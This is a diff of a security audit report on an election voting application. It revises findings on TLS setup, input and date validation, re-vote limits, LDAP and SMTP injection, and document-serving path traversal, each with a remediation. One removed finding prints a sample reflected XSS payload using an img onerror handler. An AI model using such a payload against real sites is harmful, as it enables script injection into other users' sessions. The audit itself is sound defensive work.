-Provide a production configuration example using Let's Encrypt or other CA-signed certificates. Add deployment documentation requiring publicly trusted certificates for production. Consider integrating ACME (Let's Encrypt) certificate provisioning. Example production configuration:
-```yaml
-server:
-    port: 443
-    certfile: /etc/letsencrypt/live/voting.example.org/fullchain.pem
-    keyfile: /etc/letsencrypt/live/voting.example.org/privkey.pem
-```
-
----
-
-#### FINDING-148: No Visible TLS Certificate Validation for Outbound OAuth Connections
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 12.3.2 |
-| Files | v3/server/main.py (44-49) |
-| Source Reports | 12.3.2.md |
-| Related Findings | | **Description:**
-
-The application makes outbound HTTPS connections to oauth.apache.org for authentication. The actual HTTP client implementation is within asfquart (not provided), and there is no visible code confirming: 1) TLS certificate validation is enabled (not verify=False), 2) Certificate chain is validated against system trust store, 3) Hostname verification is performed. While Python's urllib/requests/httpx default to validating certificates, custom HTTP clients or misconfiguration could disable this.
-
-**Remediation:**
-
-Verify that the asfquart library's HTTP client has certificate validation enabled. Add explicit configuration to enforce certificate verification:
-```python
-import httpx
-async with httpx.AsyncClient(verify=True) as client:
-    response = await client.get(oauth_url)
-```
-
----
-
-#### FINDING-149: Self-Signed Certificates for Internal/Development Use with No Trust Management
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 12.3.4 |
-| Files | v3/docs/quickstart.md (49-53), v3/server/config.yaml.example (25-31) |
-| Source Reports | 12.3.4.md |
-| Related Findings | | **Description:**
-
-The system uses self-signed certificates but there is no: 1. Internal CA configuration or documentation 2. Trust store management for consuming services 3. Certificate pinning for internal connections 4. Guidance on which specific self-signed certificates should be trusted by clients/proxies. If the reverse proxy connects to this backend, it would need to trust the self-signed certificate. Without a specific internal CA or pinning configuration, this creates a risk that any self-signed certificate could be accepted. A consuming service (reverse proxy) configured to trust "any" self-signed certificate or to skip validation when connecting to this backend would be vulnerable to MITM attacks on the internal network.
-
-**Remediation:**
-
-Establish an internal CA and document certificate provisioning. Configure the reverse proxy to pin the specific backend certificate or trust only the internal CA. Example nginx proxy configuration:
-```nginx
-upstream backend {
-    server localhost:58383;
-}
-server {
-    location / {
-        proxy_pass https://backend;
-        proxy_ssl_trusted_certificate /etc/nginx/internal-ca.pem;
-        proxy_ssl_verify on;
-    }
-}
-```
-
----
-
-#### FINDING-150: Incomplete Documentation of Input Validation Rules for User-Supplied Text Fields
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L1 |
-| CWE | |
-| ASVS Sections | 2.1.1 |
-| Files | v3/docs/schema.md, v3/server/pages.py |
-| Source Reports | 2.1.1.md |
-| Related Findings | | **Description:**
-
-The documentation (schema.md) defines structural rules for internal identifiers (eid, iid as 10-char hex, salt as 16 bytes, etc.) but fails to document validation rules for user-supplied input data including: Election title (max length, allowed characters, format), Issue title (max length, allowed characters), Issue description (max length, allowed characters, format), Vote string (votestring) format per vote type (yna: expected values, stv: ranking format), Person email format validation rules (RFC 5322 compliance), Person name (max length, allowed characters), Date inputs (expected format, range constraints), and Authorization group (authz) allowed values/format. Data flow: User form input → server endpoint → database storage → no documented validation specification. Developers implementing or maintaining the application have no reference for what constitutes valid input. This leads to inconsistent validation (some fields validated, others not), making it difficult to verify correctness or identify gaps.
-
-**Remediation:**
-
-Create an input-validation.md document specifying validation rules for all user input fields. Example entries: Election Title - Type: String, Required: Yes, Max length: 200 characters, Allowed: Unicode printable characters no control characters, Validation: Non-empty after trimming whitespace. Vote String (YNA) - Type: String, Required: Yes, Allowed values: yes/no/abstain, Case-insensitive. Vote String (STV) - Type: String, Required: Yes, Format: Comma-separated candidate labels from issue's labelmap, Validation: Each label must exist in issue.kv.labelmap, no duplicates.
-
----
-
-#### FINDING-151: No Documentation of Temporal Consistency Rules for Election Dates
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 2.1.2 |
-| Files | v3/docs/schema.md, v3/server/pages.py |
-| Source Reports | 2.1.2.md |
-| Related Findings | | **Description:**
-
-While the code enforces state-based restrictions (e.g., can only add issues when editable, can only vote when open), these rules are not documented in the business logic documentation. Missing documentation includes: Adding voters is only valid when election.salt IS NULL (editable state); Adding issues is only valid when election.salt IS NULL; Voting is only valid when election.salt IS NOT NULL AND closed != 1; Tallying is only valid when closed = 1; Issue IID must belong to the election's EID when voting; Voter PID must have a mayvote entry for the issue IID
-
-**Remediation:**
-
-Document the expected temporal relationships: close_at must be after open_at if both are set; open_at should be in the future when the election is editable; neither date can be modified once the election is closed (enforced by trigger)
-
----
-
-#### FINDING-152: No Documentation of Per-User or Global Business Logic Limits
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 2.1.3 |
-| Files | schema.md, TODO.md, create-election.py (67), election.py (169) |
-| Source Reports | 2.1.3.md |
-| Related Findings | | **Description:**
-
-The application documentation does not define any limits on per-user operations (maximum elections a user can create, maximum issues per election, maximum voters per election/issue, rate limiting on vote submissions, rate limiting on election creation) or global operations (maximum concurrent open elections, maximum total elections in the system, maximum title/description field lengths, maximum number of STV candidates, maximum number of STV seats, timeout for election open/close operations). The create-election.py validates STV seats as positive integer but no upper bound, and election.py has no limits on issue count. Without documented limits, the application is vulnerable to resource exhaustion (creating thousands of issues/elections) and there's no reference for implementing rate limiting or quotas.
-
-**Remediation:**
-
-Create a business limits document specifying: Per-User limits (Max elections created: 50 configurable, Max concurrent open elections owned: 10), Per-Election limits (Max issues: 500, Max eligible voters: 10,000, Max STV candidates per issue: 50, Max STV seats: candidates - 1), Global limits (Election title max length: 200 characters, Issue title max length: 200 characters, Issue description max length: 10,000 characters)
-
----
-
-#### FINDING-153: Date Validation Checks Format But Not Logical Business Constraints
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L1, L2 |
-| CWE | |
-| ASVS Sections | 2.2.1, 2.3.2 |
-| Files | v3/server/pages.py (88-110), v3/server/pages.py (88) |
-| Source Reports | 2.2.1.md, 2.3.2.md |
-| Related Findings | | **Description:**
-
-The `_set_election_date()` function validates ISO date format parsing but does not enforce business logic constraints. Elections can be set with nonsensical dates including past dates, close dates before open dates, or dates in the far future. This confuses administrators and potentially breaks UI display logic. The validation only checks `datetime.fromisoformat()` success without verifying the date makes logical sense for an election. Data flow: JSON body `{"date": "2020-01-01"}` → `_set_election_date()` → `election.set_close_at(past_date)` — no logical validation. Impact: Confusing/misleading date information displayed to voters. Could be used to manipulate voter behavior (e.g., showing a close date has passed to discourage voting while election is still open).
-
-**Remediation:**
-
-Add business logic validation after format checking: reject dates in the past (compare against `datetime.date.today()`), ensure close_at is after open_at when both are set, and consider adding reasonable range limits (e.g., not more than 5 years in the future). Return HTTP 400 with descriptive error messages for violations. Add logical date validation: Ensure close_at > open_at, validate dates are not in unreasonable past, and check that dates are within reasonable future bounds.
-
----
-
-#### FINDING-154: Client-Side Required Field Validation Not Replicated Server-Side
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L1 |
-| CWE | |
-| ASVS Sections | 2.2.2 |
-| Files | v3/server/pages.py, v3/server/templates/manage.ezt (92) |
-| Source Reports | 2.2.2.md |
-| Related Findings | | **Description:**
-
-The HTML form uses client-side 'required' attribute and JavaScript validation, but the server-side handler does NOT verify the field is non-empty. The server-side handler in do_add_issue_endpoint does not check if form.title is empty or contains only whitespace. This allows bypassing client-side validation by sending a direct HTTP request with empty title and description fields, creating issues with empty titles and violating data quality expectations.
-
-**Remediation:**
-
-Add server-side validation to verify required fields are non-empty. Example:
-```python
-async def do_add_issue_endpoint(election):
-    form = edict(await quart.request.form)
-    title = form.get('title', '').strip()
-    if not title:
-        await flash_danger('Issue title is required.')
-        return quart.redirect(f'/manage/{election.eid}', code=303)
-```
-
----
-
-#### FINDING-155: No Validation That STV Vote Rankings Reference Valid Candidates from Issue's Labelmap
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 2.2.3 |
-| Files | v3/steve/election.py (231-244) |
-| Source Reports | 2.2.3.md |
-| Related Findings | | **Description:**
-
-For STV issues, the votestring should contain a ranking of candidates whose labels exist in the issue's kv.labelmap. This combined data consistency (vote references valid candidates from the issue's metadata) is not validated. The add_vote() method stores the votestring without checking that candidate labels match the issue's labelmap, that ranking count is valid, or that there are no duplicate candidates.
-
-**Remediation:**
-
-Validate that each ranked candidate label exists in the issue's kv.labelmap and there are no duplicates. Check that the ranking count does not exceed the number of candidates in the labelmap. Reject votes that reference non-existent candidates or contain duplicates.
-
----
-
-#### FINDING-156: No Prerequisite Validation Before Election Opening
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L1 |
-| CWE | |
-| ASVS Sections | 2.3.1 |
-| Files | v3/steve/election.py (70), v3/server/pages.py (431) |
+| CWE | CWE-754 |
+| ASVS sections | 2.3.1 |
+| Files | v3/steve/election.py:70, v3/server/pages.py:431 |
 | Source Reports | 2.3.1.md |
-| Related Findings | | **Description:**
+| Related | |
 
-An election can be opened without any issues or eligible voters by calling `/do-open/<eid>` immediately after creation. The `open()` method does not verify that the election has been properly configured with issues and voters before allowing the state transition. This represents a skipped step in the business flow (configure → validate → open). The election opens successfully but is useless and irreversible, which is logically invalid.
+**Description:**
+
+The `open()` method does not validate that an election has the necessary prerequisites (issues and eligible voters) before allowing it to be opened. An attacker can create an election and immediately open it without adding any issues or voters, resulting in a logically invalid and irreversible election state. This represents a skipped step in the business flow (configure → validate → open).
 
 **Remediation:**
 
-Add prerequisite validation in the `open()` method before allowing the state transition. Verify that the election has at least one issue and at least one eligible voter:
-```python
-issues = self.list_issues()
-if not issues:
-    raise ValueError('Cannot open election with no issues')
-```
-and
-```python
-self.q_voting_persons.perform(self.eid)
-voters = self.q_voting_persons.fetchall()
-if not voters:
-    raise ValueError('Cannot open election with no eligible voters')
-```
+Add prerequisite validation in the `open()` method: verify that at least one issue exists (`issues = self.list_issues(); if not issues: raise ValueError('Cannot open election with no issues')`) and that at least one eligible voter is registered (`self.q_voting_persons.perform(self.eid); voters = self.q_voting_persons.fetchall(); if not voters: raise ValueError('Cannot open election with no eligible voters')`).
 
 ---
 
-#### FINDING-157: Election Creation Script Has Transaction Code Commented Out
+#### FINDING-146: No Logical Constraint Validation on Election Dates
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 2.3.3 |
-| Files | v3/server/bin/create-election.py (83-87), v3/server/bin/create-election.py (109-112) |
+| CWE | CWE-20 |
+| ASVS sections | 2.3.2 |
+| Files | v3/server/pages.py:88 |
+| Source Reports | 2.3.2.md |
+| Related | |
+
+**Description:**
+
+The _set_election_date() function validates date format but does not perform logical validation on election dates. It accepts dates in the past and does not verify that close_at is after open_at. This could result in confusing or misleading date information displayed to voters and could be used to manipulate voter behavior, such as showing a close date has passed to discourage voting while the election is still open.
+
+**Remediation:**
+
+Add logical date validation to ensure close_at is after open_at and that dates are not set to unreasonable values in the past. Implement business logic constraints that enforce sensible date ranges for elections.
+
+---
+
+#### FINDING-147: Election Creation Script Has Transaction Code Commented Out
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | CWE-662 |
+| ASVS sections | 2.3.3 |
+| Files | v3/server/bin/create-election.py:83, v3/server/bin/create-election.py:109 |
 | Source Reports | 2.3.3.md |
-| Related Findings | | **Description:**
+| Related | FINDING-046, FINDING-047 |
 
-The create-election.py script has transaction wrapping code (BEGIN TRANSACTION, COMMIT, ROLLBACK) commented out with a TODO note. If voter addition fails partway through (e.g., PID not found), the election is left with some but not all eligible voters. No rollback occurs, leaving the election in an inconsistent state.
+**Description:**
+
+The create-election.py script has transaction wrapping code (BEGIN TRANSACTION, COMMIT, ROLLBACK) commented out with a TODO note. If voter addition fails partway through (e.g., PID not found), the election is left with some but not all eligible voters. No rollback occurs, leaving the election in a partially configured state.
 
 **Remediation:**
 
-Re-enable the transaction wrapping code by uncommenting the BEGIN TRANSACTION at the start of the try block and the COMMIT/ROLLBACK statements in the success and exception paths respectively.
+Re-enable the transaction wrapping code by uncommenting the BEGIN TRANSACTION, COMMIT, and ROLLBACK statements. Ensure database setup allows for proper transaction support.
 
 ---
 
-#### FINDING-158: Vote Table Allows Unlimited Re-Votes Without Locking or Rate Control
+#### FINDING-148: Vote Table Allows Unlimited Re-Votes Without Locking or Rate Control
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 2.3.4 |
-| Files | v3/steve/election.py (231), v3/queries.yaml (44) |
+| CWE | CWE-770 |
+| ASVS sections | 2.3.4 |
+| Files | v3/steve/election.py:231, v3/queries.yaml:44 |
 | Source Reports | 2.3.4.md |
-| Related Findings | | **Description:**
+| Related | |
 
-Each call to add_vote() performs a pure INSERT into the vote table. There's no UPDATE or UPSERT — every submission creates a new row. No limit on how many rows a single vote_token can accumulate. Each call to add_vote() performs a pure INSERT. Repeatedly POSTing to /do-vote/&lt;eid&gt; with the same ballot adds a new row for each issue. After 1000 submissions, there are 1000 rows per vote_token, consuming storage and making tally queries slower. While re-voting is an intended feature (only the latest vote counts), there's no limit on how many times a voter can re-vote, potentially exhausting storage or degrading tally performance.
+**Description:**
+
+Each call to add_vote() performs a pure INSERT into the vote table. There's no UPDATE or UPSERT — every submission creates a new row. No limit on how many rows a single vote_token can accumulate. Repeatedly POSTing to /do-vote/&lt;eid&gt; with the same ballot adds a new row for each issue on each submission. After 1000 submissions, there are 1000 rows per vote_token, consuming storage and making tally queries slower. While re-voting is an intended feature (only the latest vote counts), there's no limit on how many times a voter can re-vote, potentially exhausting storage or degrading tally performance.
 
 **Remediation:**
 
@@ -3277,661 +3439,1149 @@ Consider either an UPDATE pattern (replacing the existing vote) or limiting re-v
 
 ---
 
-#### FINDING-159: Irreversible Election State Changes Require Only Single-User Action
+#### FINDING-149: Irreversible Election State Changes Require Only Single-User Action
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L3 |
-| CWE | |
-| ASVS Sections | 2.3.5 |
-| Files | v3/server/pages.py (431), v3/server/pages.py (451) |
+| CWE | CWE-863 |
+| ASVS sections | 2.3.5 |
+| Files | v3/server/pages.py:431, v3/server/pages.py:451 |
 | Source Reports | 2.3.5.md |
-| Related Findings | | **Description:**
+| Related | FINDING-251 |
+
+**Description:**
 
 Opening an election triggers irreversible cryptographic operations (salt generation, opened_key computation). Closing an election permanently ends voting. Both actions have significant organizational impact — voters may be disenfranchised by premature closure, or an improperly configured election may be opened without review. A single user (or compromised account) can irreversibly alter election state without oversight. For an organization like the ASF where elections determine governance, this represents a high-value operation that should require multi-party approval.
 
 **Remediation:**
 
-Add approval workflow with separate request and approval endpoints. Example: Add /do-request-open/&lt;eid&gt; to record the request and notify approvers, and /do-approve-open/&lt;eid&gt; to verify approver is different from requester, verify approver has authority, and execute the state change. Ensure the approver is different from the requester and has proper authority.
+Add approval workflow: Create endpoints for requesting state changes (/do-request-open/&lt;eid&gt;) that record the request and notify approvers. Create approval endpoints (/do-approve-open/&lt;eid&gt;) that verify the approver is different from the requester, verify approver has authority, and execute the state change only after approval.
 
 ---
 
-#### FINDING-160: No Rate Limiting on Authentication-Gated Page Views
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 2.4.1 |
-| Files | v3/server/pages.py (133), v3/server/pages.py (279), v3/server/pages.py (221) |
-| Source Reports | 2.4.1.md |
-| Related Findings | | **Description:**
-
-Authentication-gated page views including `/voter`, `/admin`, and vote pages have no rate limiting. Each page view triggers multiple database queries with JOINs across mayvote, issue, election, and person tables. High-frequency requests from an authenticated user could cause denial of service via query overload on the SQLite database. Data flow: Authenticated user → unlimited GET requests → repeated database queries → resource exhaustion.
-
-**Remediation:**
-
-Apply general rate limiting at the application or reverse-proxy level for all authenticated page views.
-
----
-
-#### FINDING-161: No Minimum Time Enforcement in add_vote() Business Logic
+#### FINDING-150: No Minimum Time Enforcement in add_vote() Business Logic
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L3 |
-| CWE | |
-| ASVS Sections | 2.4.2 |
-| Files | v3/steve/election.py (180-194) |
+| CWE | CWE-799 |
+| ASVS sections | 2.4.2 |
+| Files | v3/steve/election.py:231 |
 | Source Reports | 2.4.2.md |
-| Related Findings | | **Description:**
+| Related | |
 
-The business logic layer's add_vote() function has no concept of vote timing. There is no tracking of when a voter last submitted a vote, no minimum interval enforcement between re-votes, and the vote table lacks a timestamp column that could enable retroactive timing analysis. Combined with the handler-level lack of rate limiting, there is zero defense-in-depth against automated vote submission.
+**Description:**
 
-**Remediation:**
-
-Implement vote timing tracking in the add_vote() business logic by checking time since last vote by the same vote_token and raising a VoteTooRapid exception if the vote is submitted within MINIMUM_REVOTE_INTERVAL seconds.
-
----
-
-#### FINDING-162: Flash messages include unsanitized issue ID from form field names
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | CWE-79 |
-| ASVS Sections | 1.3.3 |
-| Files | v3/server/pages.py (443) |
-| Source Reports | 1.3.3.md |
-| Related Findings | FINDING-030, FINDING-031, FINDING-032, FINDING-033, FINDING-034, FINDING-035, FINDING-126, FINDING-127 | **Description:**
-
-The do_vote_endpoint() function extracts issue ID from form field names using key.split('-', 1)[1] and includes it in flash messages without HTML escaping. Form field names in POST body (attacker-controlled) are processed by splitting on '-' and extracting everything after 'vote-', then passed to flash_danger() message which may be rendered in template as raw HTML. This creates reflected XSS if the flash template renders message content without escaping. Example payload: vote-&lt;img src=x onerror=alert(1)&gt;=yes.
+The business logic layer for vote submission has no concept of vote timing. There is no tracking of when a voter last submitted a vote, no minimum interval enforcement between re-votes, and no defense-in-depth against automated vote submission. The vote table lacks a timestamp column that could enable retroactive timing analysis. Combined with the handler-level lack of rate limiting, there is zero defense-in-depth against automated vote submission.
 
 **Remediation:**
 
-Apply html.escape() to all user-controlled data included in flash messages:
-```python
-import html
-await flash_danger(f'Invalid issue ID: {html.escape(iid)}')
-```
-Consider creating a wrapper function for safe flash messages.
+Add timestamp tracking to the vote submission logic. Check time since last vote by the same vote_token and raise VoteTooRapid exception if submitted within minimum revote interval. Implement query to retrieve last vote time and enforce minimum interval at business logic layer.
 
 ---
 
-#### FINDING-163: Email Infrastructure Exists Without Visible Sanitization
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | CWE-93 |
-| ASVS Sections | 1.3.11 |
-| Files | v3/steve/election.py (335-342) |
-| Source Reports | 1.3.11.md |
-| Related Findings | | **Description:**
-
-The method `get_voters_for_email()` retrieves voter data (name and email) from the database for email purposes. The `name` field originates from LDAP `cn` attribute and could theoretically contain SMTP header injection characters (`\r\n`) if LDAP data is malformed. When used in email headers (To, From, Subject), these could inject additional headers (BCC, CC) or alter message content. The email-sending code itself is not in the provided files, so sanitization at the send boundary cannot be verified. Data flow: LDAP `cn` field → `pdb.add_person(uid, visname, email)` → database → `get_voters_for_email()` → email system.
-
-**Remediation:**
-
-Implement sanitization at the boundary where email is sent. Add a utility function to remove SMTP header injection characters:
-
-```python
-def sanitize_email_header(value: str) -> str:
-    """Remove characters that could enable SMTP header injection."""
-    return value.replace('\r', '').replace('\n', '').replace('\x00', '')
-
-# When constructing email:
-recipient_name = sanitize_email_header(voter.name)
-recipient_email = sanitize_email_header(voter.email)
-```
-
----
-
-#### FINDING-164: LDAP Operations Lack Defensive Coding for Future Extension
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 1.3.8 |
-| Files | v3/server/bin/asf-load-ldap.py (48) |
-| Source Reports | 1.3.8.md |
-| Related Findings | | **Description:**
-
-The current LDAP search filter is hardcoded and safe. However, the application stores an 'authz' field in elections (LDAP group names per the domain context), and the code contains multiple '### check authz' placeholders throughout pages.py. When authorization checks are implemented, they will likely need to query LDAP with the authz value. No sanitization framework exists for future LDAP filter construction. Data flow: form.authz → Election.create() → stored in DB → (future) LDAP query → potential injection. Impact: Low currently (hardcoded filter), but when '### check authz' is implemented, LDAP special characters (*, (, ), \, NUL) in group names could enable LDAP injection if not escaped.
-
-**Remediation:**
-
-Implement LDAP filter escaping using ldap.filter.escape_filter_chars() before constructing LDAP filters with user-controlled values. Example:
-
-```python
-import ldap.filter
-
-def safe_ldap_filter(group_name):
-    """Escape LDAP special characters for filter construction."""
-    escaped = ldap.filter.escape_filter_chars(group_name)
-    return f'(cn={escaped})'
-```
-
-Integrate this as a mandatory step before implementing the '### check authz' functionality.
-
----
-
-#### FINDING-165: Missing File Handling Documentation for Issue Documents
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 5.1.1 |
-| Files | v3/server/pages.py (560-574), v3/docs/schema.md (N/A) |
-| Source Reports | 5.1.1.md |
-| Related Findings | | **Description:**
-
-The application serves documents from `DOCSDIR/<iid>/` via the `/docs/<iid>/<docname>` endpoint, and issue descriptions can reference documents via `doc:filename` syntax (processed by `rewrite_description`). However, there is no documentation anywhere in the provided codebase that defines: permitted file types for documents associated with issues, expected file extensions, maximum file size (or maximum unpacked size), or how the application handles malicious files detected during download/processing. Without documented policies on accepted file types, extensions, and sizes, developers cannot implement consistent file validation. End users downloading served documents have no assurance that files have been vetted for malware or unsafe content (e.g., polyglot files, malicious macros).
-
-**Remediation:**
-
-Create explicit documentation specifying: permitted file types for issue documents (e.g., PDF (.pdf) - application/pdf, Plain text (.txt) - text/plain, PNG images (.png) - image/png), maximum file size (e.g., individual file: 10 MB, per-issue total: 50 MB), and malicious file handling procedures (e.g., files are scanned with ClamAV on upload, files failing validation are rejected with HTTP 415 and logged, served files include `Content-Disposition: attachment` header, X-Content-Type-Options: nosniff is set on all responses).
-
----
-
-#### FINDING-166: No compressed file validation against uncompressed size and file count limits
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | |
-| ASVS Sections | 5.2.3 |
-| Files | v3/server/pages.py (entire application scope) |
-| Source Reports | 5.2.3.md |
-| Related Findings | | **Description:**
-
-The application has a document serving mechanism (`/docs/<iid>/<docname>`) but no visible handling or validation of compressed files (zip, gz, docx, odt, etc.). There is no code that: 1. Detects if a served or uploaded file is a compressed archive 2. Checks the maximum uncompressed size before extraction 3. Limits the maximum number of files within an archive 4. Prevents zip bomb attacks. Since the upload mechanism is not shown in the provided code, it is impossible to verify that compressed file protections exist upstream. If compressed files (e.g., zip bombs) are placed in `DOCSDIR` through any mechanism, they could be served to users or potentially processed server-side without decompression limits, leading to denial of service.
-
-**Remediation:**
-
-Implement compressed file validation that checks: 1) if file is a compressed archive using zipfile.is_zipfile() or similar, 2) total number of files in archive against MAX_FILES_IN_ARCHIVE (e.g., 100), 3) total uncompressed size against MAX_UNCOMPRESSED_SIZE (e.g., 100 MB), 4) compression ratio to detect zip bombs (e.g., reject if ratio > 100). Reject files failing any check with appropriate error messages.
-
----
-
-#### FINDING-167: No per-user file quota or maximum file count enforcement
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L3 |
-| CWE | |
-| ASVS Sections | 5.2.4 |
-| Files | v3/server/pages.py (entire application scope), v3/schema.sql (database schema) |
-| Source Reports | 5.2.4.md |
-| Related Findings | | **Description:**
-
-There is no per-user file quota or maximum file count enforcement anywhere in the provided code or database schema. The database schema (v3/schema.sql) contains tables for elections, issues, persons, mayvotes, and votes — but nothing tracking file storage per user. Documents are served from DOCSDIR/&lt;iid&gt;/ but there is no: 1. Database table or column tracking per-user storage consumption 2. Check limiting the total number of files a user can upload 3. Check limiting total storage bytes per user 4. Any quota enforcement mechanism. A single user (or compromised account) could fill available storage by uploading an unlimited number of files or excessively large files, causing denial of service for all users.
-
-**Remediation:**
-
-Add file tracking table to database schema with columns for file_id, pid, iid, filename, file_size, and uploaded_at. Implement quota checking function that validates against MAX_FILES_PER_USER (e.g., 50) and MAX_STORAGE_PER_USER (e.g., 500 MB) before accepting file uploads. Query user's current file count and total storage, rejecting uploads that would exceed limits.
-
----
-
-#### FINDING-168: No symlink detection or prevention in compressed file handling
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L3 |
-| CWE | |
-| ASVS Sections | 5.2.5 |
-| Files | v3/server/pages.py (entire application scope) |
-| Source Reports | 5.2.5.md |
-| Related Findings | | **Description:**
-
-There is no handling of compressed files visible in the provided code, and consequently no symlink detection or prevention. If documents placed in DOCSDIR originated from extracted archives, symbolic links within those archives could allow access to sensitive files outside the intended directory. While send_from_directory provides some protection against traversal, symlinks resolved at the filesystem level could bypass this. If an attacker can place a compressed file containing symlinks (e.g., pointing to /etc/passwd or the database file) and it gets extracted into DOCSDIR, the serve_doc endpoint could serve sensitive system files to authorized users.
-
-**Remediation:**
-
-Implement validation functions to detect and reject symlinks in archives before extraction. Use validate_no_symlinks() to check archive contents for symlink attributes. Implement safe_extract() to prevent both symlinks and path traversal during extraction. Add symlink check in serve_doc endpoint using filepath.is_symlink() and abort with 403 if detected. Consider mounting DOCSDIR filesystem with nosymfollow option to prevent symlink resolution at OS level.
-
----
-
-#### FINDING-169: Missing application-level validation for user-supplied docname parameter in serve_doc()
+#### FINDING-151: Configuration Template Missing TLS Version Controls
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L1 |
-| CWE | CWE-22 |
-| ASVS Sections | 5.3.2 |
-| Files | v3/server/pages.py (560-574) |
-| Source Reports | 5.3.2.md |
-| Related Findings | FINDING-279 | **Description:**
+| CWE | |
+| ASVS sections | 12.1.1 |
+| Files | v3/server/config.yaml.example:6-12 |
+| Source Reports | 12.1.1.md |
+| Related | |
 
-The serve_doc() function uses the user-supplied docname URL parameter directly in send_from_directory() without application-level validation. The developer explicitly acknowledged this gap with the comment '### verify the propriety of DOCNAME.' While Quart's send_from_directory() internally uses safe_join() to prevent path traversal, there is no defense-in-depth validation at the application layer. Relying solely on framework internals without application-level validation creates risk if: 1) The framework is upgraded and safe_join behavior changes, 2) A bypass is discovered in safe_join, 3) The code is refactored to use a different file-serving mechanism.
+**Description:**
 
-**Remediation:**
-
-Add an explicit allowlist regex (e.g., ^[a-zA-Z0-9][a-zA-Z0-9._-]*$) to validate docname and reject requests with invalid filenames including path traversal sequences. Validate before passing to send_from_directory() and abort with 400 for invalid filenames.
-
-#### FINDING-170: Missing filename validation and Content-Disposition header in document download endpoint
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 5.4.1, 5.4.2 |
-| **Files** | v3/server/pages.py:560-574 |
-| **Source Reports** | 5.4.1.md, 5.4.2.md |
-| **Related** | - | **Description:**
-
-The serve_doc() endpoint accepts a user-submitted filename via the docname URL parameter and uses it directly to serve files. There is no validation or sanitization of this filename, and no explicit Content-Disposition header is set in the response to override the user-controlled filename. Without explicit filename validation: 1. The Content-Type of the response is derived from the user-controlled filename extension, which could cause browser behavior differences. 2. If the response includes a Content-Disposition header, the user-controlled filename could contain injection characters. 3. The lack of explicit Content-Disposition means the browser uses the URL's filename segment for Save As operations.
+The configuration template provides no guidance or fields for specifying TLS protocol versions. Administrators deploying this application have no documented mechanism to enforce TLS 1.2+ or prefer TLS 1.3.
 
 **Remediation:**
 
-Implement filename validation using an allowlist regex (e.g., ^[a-zA-Z0-9][a-zA-Z0-9._-]*$) and reject requests with invalid filenames. Sanitize the filename using secure_filename() from werkzeug.utils. Serve files with explicit Content-Disposition header using as_attachment=True in send_from_directory(). Add X-Content-Type-Options: nosniff header for defense-in-depth. Implement file extension allowlist to only serve known-safe extensions (.pdf, .txt, .md, etc.).
+Add TLS version configuration to the example config: server.certfile, server.keyfile, and server.min_tls_version: "1.2" (Minimum TLS version 1.2 or 1.3)
 
 ---
 
-#### FINDING-171: No Antivirus Scanning for Documents Served to Users
+#### FINDING-152: OCSP Stapling Not Configured for TLS Server
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 5.4.3 |
-| **Files** | v3/server/pages.py:598-614, v3/server/pages.py:50-57 |
-| **Source Reports** | 5.4.3.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | |
+| ASVS sections | 12.1.4 |
+| Files | v3/server/main.py:75-82, v3/server/config.yaml.example |
+| Source Reports | 12.1.4.md |
+| Related | |
 
